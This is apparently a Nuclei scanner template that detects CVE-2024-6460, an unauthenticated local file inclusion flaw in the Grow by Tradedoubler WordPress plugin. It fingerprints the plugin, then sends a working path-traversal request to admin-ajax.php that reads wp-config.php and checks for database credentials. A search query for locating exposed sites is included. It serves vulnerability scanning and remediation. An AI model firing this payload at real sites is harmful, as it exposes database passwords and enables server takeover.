flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - tradedoubler-affiliate-tracker
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=tm_load_data&component=../../../../wp-config.php

    '
id: CVE-2024-6460
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2024-6460
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.99562
    epss-score: 0.9014
  description: 'The Grow by Tradedoubler WordPress plugin through version 2.0.21 is
    vulnerable to Local File Inclusion via the component parameter. This makes it
    possible for attackers to include and execute PHP files on the server, allowing
    the execution of any PHP code in those files.

    '
  impact: 'Unauthenticated attackers can exploit local file inclusion to read sensitive
    files like wp-config.php and potentially execute arbitrary PHP code.

    '
  metadata:
    fofa-query: body="wp-content/plugins/tradedoubler-affiliate-tracker/"
    max-request: 2
    product: tradedoubler-affiliate-tracker
    vendor: WordPress
  name: WordPress Grow by Tradedoubler Plugin < 2.0.22 - Unauthenticated Local File
    Inclusion
  reference:
  - https://wpscan.com/vulnerability/ba2f53e0-30be-4f37-91bc-5fa151f1eee7
  - https://nvd.nist.gov/vuln/detail/CVE-2024-6460
  remediation: 'Update Grow by Tradedoubler plugin to version 2.0.22 or later to address
    the local file inclusion vulnerability.

    '
  severity: critical
  tags: cve,cve2024,wp,wordpress,wp-plugin,lfi,tradedoubler-affiliate-tracker,vuln
